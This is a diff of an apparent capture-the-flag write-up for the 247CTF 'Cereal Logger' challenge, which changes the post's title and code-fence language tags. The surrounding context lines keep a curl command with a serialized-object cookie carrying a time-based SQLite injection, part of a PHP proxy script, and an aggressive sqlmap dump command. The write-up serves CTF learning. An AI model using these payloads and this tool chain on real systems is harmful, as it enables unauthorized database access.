@@ -1,5 +1,5 @@
 ---
-title: "CEREAL LOGGER | 247CTF"
+title: "Chaining SQLmap with a custom php proxy server | 247CTF"
 date: 2024-06-16
 categories: [CHALLENGES, CEREAL LOGGER]
 tags: [CHALLENGES, CTF] 
@@ -52,7 +52,7 @@ Note: The SQLite `randomblob()` function returns a blob containing pseudo-random
 
 ![IMG5](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/3132b08b-bd51-4666-bc5e-08125625a523)
 
-```
+```php
 <?php
 
 class insert_log
@@ -71,7 +71,7 @@ echo $final_payload;
 
 Let's try it :
 
-```
+```shell
 time curl -XGET https://a0351f3d2e04038e.247ctf.com/ -b '247=TzoxMDoiaW5zZXJ0X2xvZyI6MTp7czo4OiJuZXdfZGF0YSI7czo1MjoiMFhNb2hvbWllc3RlcicpOyBzZWxlY3QgMSA9IHJhbmRvbWJsb2IoOTk5OTk5OTk5KTstLSI7fQ==.0e'
 ```
 
@@ -97,7 +97,7 @@ we can create a simple local web application act as `proxy server` that manage s
 
 Here is a simple web application using PHP!
 
-```
+```php
 <?php
 
 $payload = $_GET['payload'];
@@ -139,11 +139,11 @@ echo $response;
 ```
 
 we can deploy php server locally using: 
-```
+```shell
 php -S 0.0.0.0:80
 ``` 
 using sqlmap command: 
-```
+```shell
 sqlmap -u "http://127.0.0.1:80/?payload=test" -p "payload" --dbms sqlite --technique=T --dump --level 5 --risk 3 --no-cast  --random-agent
 ```
 
